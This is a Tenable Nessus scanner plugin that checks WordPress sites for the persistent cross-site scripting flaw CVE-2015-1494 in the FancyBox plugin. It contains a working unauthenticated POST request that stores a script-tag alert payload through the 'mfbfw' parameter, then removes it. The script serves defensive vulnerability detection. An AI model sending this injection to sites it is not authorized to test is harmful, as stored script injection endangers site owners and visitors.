#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(81385);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/02/17 14:16:17 $");

  script_cve_id("CVE-2015-1494");
  script_bugtraq_id(72506);
  script_osvdb_id(117940);

  script_name(english:"FancyBox Plugin for WordPress 'mfbfw' Parameter Persistent XSS");
  script_summary(english:"Attempts to inject script code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is affected by a
persistent cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the FancyBox plugin for WordPress installed on the
remote host is affected by a persistent cross-site scripting
vulnerability due to a failure properly sanitize user-supplied input
to the 'mfbfw' POST parameter when the 'action' parameter is set to
'update'. A remote, unauthenticated attacker can exploit this issue to
inject arbitrary script code into a user's browser to be executed
within the security context of the affected site.");
  script_set_attribute(attribute:"see_also", value:"https://wordpress.org/support/topic/possible-malware-2?replies=38");
  # http://blog.sucuri.net/2015/02/zero-day-in-the-fancybox-for-wordpress-plugin.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a7483f58");
  script_set_attribute(attribute:"see_also", value:"https://wordpress.org/plugins/fancybox-for-wordpress/changelog/");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 3.0.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/02/04");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/02/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/02/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "FancyBox";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  path = "/wp-content/plugins/fancybox-for-wordpress/";

  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('fancybox', ' jQuery (P|p)lugin', 'Janis Skarnelis');

  checks[path + "fancybox/jquery.fancybox.js"] = regexes;
  checks[path + "jquery.fancybox.js"] = regexes;

  checks[path + "readme.txt"][0] = make_list('=== FancyBox for WordPress ===', 'Seamlessly integrates FancyBox');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");


function cleanup()
{
  local_var res;
  # Set extraCalls to blank to remove the persistent XSS
  res = http_send_recv3(
    method      : "POST",
    item        : dir + "/wp-admin/admin-post.php?page=fancybox-for-wordpress",
    port        : port,
    data        : "action=update&mfbfw[extraCallsEnable]=on&mfbfw[extraCalls]=",
    add_headers :make_array("Content-Type","application/x-www-form-urlencoded"),
    exit_on_fail: TRUE
  );
  if (res[0] =~ "(301|200|302)") return 1;
  return NULL;
}

data = "</script><script>alert('" + SCRIPT_NAME - ".nasl" + "-" + unixtime() +
  "');</script>";
pat = "\</script\>\<script\>alert\('" +SCRIPT_NAME - ".nasl"+"-"+unixtime()+
  "'\);\</script\>";

res = http_send_recv3(
  method       : "POST",
  item         : dir + "/wp-admin/admin-post.php?page=fancybox-for-wordpress",
  port         : port,
  data         : "action=update&mfbfw[extraCallsEnable]=on&mfbfw[extraCalls]="+
                 data,
  add_headers  : make_array("Content-Type","application/x-www-form-urlencoded"),
  exit_on_fail : TRUE
);
attack_req = http_last_sent_request();

if (res[0] =~ "(301|200|302)")
{
  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : dir + "/",
    exit_on_fail : TRUE
  );

  if (ereg(pattern:pat, string:res[2], multiline:TRUE))
  {
    clean = cleanup();
    if (isnull(clean)) extra =
    'Note that the persistent XSS script injected to the site has not been' +
    '\nremoved, and will need to be manually removed.';
    else extra = '';

    output = extract_pattern_from_resp(
      string  : res[2],
      pattern : 'RE:' + pat
    );

    security_report_v4(
      port       : port,
      severity   : SECURITY_WARNING,
      generic    : TRUE,
      line_limit : 5,
      xss        : TRUE,
      rep_extra  : extra,
      request    : make_list(attack_req, install_url + "/"),
      output     : chomp(output)
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
